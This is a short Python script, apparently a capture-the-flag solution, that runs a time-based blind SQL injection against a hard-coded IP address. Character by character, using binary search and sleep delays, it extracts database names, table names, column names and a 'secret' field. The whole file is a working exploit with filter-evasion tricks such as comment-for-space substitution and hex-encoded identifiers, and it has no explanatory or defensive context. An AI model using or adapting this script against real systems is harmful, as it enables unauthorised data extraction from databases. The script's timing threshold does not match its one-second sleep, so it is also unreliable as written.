import requests
import time
import math
def send(payload):
    url="http://44.201.89.169:8092/index.php?query="
    tempurl = url + payload
    #print(payload)
    start = time.time()
    content = requests.get(tempurl).text
    end=time.time()
    return end-start

def find(low,high,index,payload):
    if low==high:
        if low == 0:
            print(result)
            exit("nothing else to leak!")
            return
        character = chr(low)
        print(f"found a char! {character}")
        return character
            
    mid = math.floor((int(high)+int(low))/2)
    
    if payload=='dbs':
        wait=send('(0)or/**/if(ascii(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),' + str(index) + ',1))>' + str(hex(mid))+',sleep(1),0)--')
    if payload=='tables':
        #sqli in hex = 0x73716c69
        wait=send('(0)or/**/if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=0x73716c69),' + str(index) + ',1))>' + str(hex(mid)) +',sleep(1),0)--')
    if payload=='columns':
        #key in hex = 0x6b6579
        #users in hex = 0x7573657273
        wait=send('(0)or/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x6b6579),' + str(index)+ ',1))>' + str(hex(mid)) +',sleep(1),0)--')
    if payload=='flag':
        #secret in hex = 0x736563726574
        wait=send('(0)or/**/if(ascii(substr((select/**/group_concat(secret)/**/from/**/sqli.key),' + str(index) + ',1))>' + str(hex(mid)) +',sleep(1),0)--')

    if(wait>3):
        return find(mid+1,high,index,payload)

    else:
        return find(low,mid,index,payload)

result = ""
input = input("Select one to leak (dbs, tables, columns, flag): ")
for i in range(1,100):
    tmp = find(0x00,0x7F,i,input)
    result += tmp